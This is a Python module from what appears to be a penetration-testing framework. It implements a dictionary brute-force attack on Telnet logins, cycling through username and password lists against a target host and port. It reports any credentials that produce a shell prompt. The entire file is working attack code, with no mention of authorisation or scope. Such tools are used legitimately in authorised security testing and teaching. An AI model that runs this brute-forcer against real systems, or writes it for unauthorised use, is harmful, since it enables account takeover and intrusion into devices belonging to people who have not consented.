import telnetlib
import time
from core.base_module import BaseModule
from rich.console import Console

class TelnetBruteforce(BaseModule):
    """Performs a dictionary-based brute-force attack on a Telnet server."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP address.'],
            'RPORT': [23, 'The target port.'],
            'USER_FILE': ['', 'Path to the username list file.'],
            'PASS_FILE': ['', 'Path to the password list file.'],
            'TIMEOUT': [3, 'Connection timeout in seconds.']
        }

    def run(self, options):
        """
        Executes the Telnet brute-force attack.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        user_file = options.get('USER_FILE')
        pass_file = options.get('PASS_FILE')
        timeout = int(options.get('TIMEOUT'))
        console = Console()

        if not rhost or not user_file or not pass_file:
            console.print("[!] RHOST, USER_FILE, and PASS_FILE must be set.", style="bold red")
            return

        try:
            with open(user_file, 'r') as f:
                users = [line.strip() for line in f]
            with open(pass_file, 'r') as f:
                passwords = [line.strip() for line in f]
        except FileNotFoundError as e:
            console.print(f"[!] File not found: {e.filename}", style="bold red")
            return

        console.print(f"[*] Starting Telnet brute-force on {rhost}:{rport}...")
        found = False

        for user in users:
            if found: break
            for password in passwords:
                try:
                    console.print(f"[*] Trying {user}:{password}")
                    tn = telnetlib.Telnet(rhost, rport, timeout)
                    tn.read_until(b"login: ")
                    tn.write(user.encode('ascii') + b"\n")
                    if password:
                        tn.read_until(b"Password: ")
                        tn.write(password.encode('ascii') + b"\n")
                    
                    # A successful login might present a shell prompt like $, #, >
                    response = tn.read_very_eager().decode('ascii')
                    if any(prompt in response for prompt in ['#', '$', '>']):
                        console.print(f"[bold green][+] Success! Credentials found: {user}:{password}[/bold green]")
                        found = True
                        break
                    tn.close()
                except Exception as e:
                    # console.print(f"[yellow]  -> Failed: {e}[/yellow]")
                    pass # Ignore failures and continue
        
        if not found:
            console.print("[yellow][-] Brute-force complete. No valid credentials found.[/yellow]")
